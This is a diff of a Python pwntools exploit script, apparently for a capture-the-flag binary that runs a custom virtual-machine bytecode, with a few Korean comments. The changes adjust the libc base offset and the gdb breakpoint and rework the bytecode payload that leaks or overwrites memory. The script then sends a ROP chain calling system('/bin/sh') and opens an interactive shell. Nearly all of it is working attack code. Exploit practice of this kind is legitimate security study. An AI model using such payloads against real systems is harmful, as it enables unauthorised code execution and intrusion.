@@ -214,7 +214,7 @@ tls_base = tls + 0xa50
 tls3_base = tls_base - 0x1001000 
 
 target = tls3_base + 0x7fec90 + 0x68
-libc_base = tls_base + 0x33f000
+libc_base = tls_base + 0x342000
 
 p_rdi  = 0x00173373 + libc_base
 p_rsi = 0x00171ba2 + libc_base
@@ -244,7 +244,7 @@ read가 끝난 뒤 올바르게 잘 조져졌는지 검사해야됨
 
 #gdb.attach(p, """
 #set follow-fork-mode child
-#b *write
+#brva 0x003DA0
 #continue
 #""")
 #pause()
@@ -256,21 +256,23 @@ thread + thread + jmp
 mov + mov + mov + mov
 3     4     5     6
 
-mov*4 + read + mov*4 + write + mov + cmp + je + mov*4 + read
-789a    b      cdef     16     17    18    19   20      24
+mov*4 + read +  cmp + jne
+789a    b       c     d 
+mov*4 + write + mov + cmp + je + mov*4 + read
+14      18      19    20    21   22      26
 
 mov + mov + xor + jmp
-25    26    27    28
+27    28    29    30
 
 """
 
-pay = thread(25) + thread(3) + jmp(2)
+
+pay = thread(27) + thread(3) + jmp(2)
 pay += mov("rv", 0, 0) + mov("mr", 0, 0) + mov("rv", 0, 8) + mov("mr", 3*8, 0)
-pay += read(0, 2*8, 3*8, 1) + write(1, 0, 8) + mov("rm", 0, 0) + cmp("rv", 0, 0) + je(7) + read(0, 0, 0x100)
-pay += mov("rv", 0, 0x58) + mov("mr", 2*8, 0) +  xor(0, 0xe00) + jmp(26)
+pay += read(0, 2*8, 3*8, 1) +  cmp("rv", 0, 8) + jne(7)
+pay += write(1, 0, 8) + mov("rm", 0, 0) + cmp("rv", 0, 0) + je(7) + read(0, 0, 0x100)
+pay += mov("rv", 0, 0xb8) + mov("mr", 2*8, 0) +  xor(0, 0xe00) + jmp(28)
 sim(pay)
-
-
 
 pay = p64(p_rdi)
 pay += p64(binsh)
@@ -285,14 +287,11 @@ pay += p64(system)
 sleep(0.1)
 p.send(p64(target))
 while True:
-    data = p.recv(8)
-    if(b'\x00' * 8 == data):
-        p.send(p64(target))
+    data = int(u64(p.recv(8))) 
+    if(data == 0):
+        p.send(p64(target)) 
     else:
         p.send(pay)
-        print(data)
         break
-
-
 
 p.interactive() 
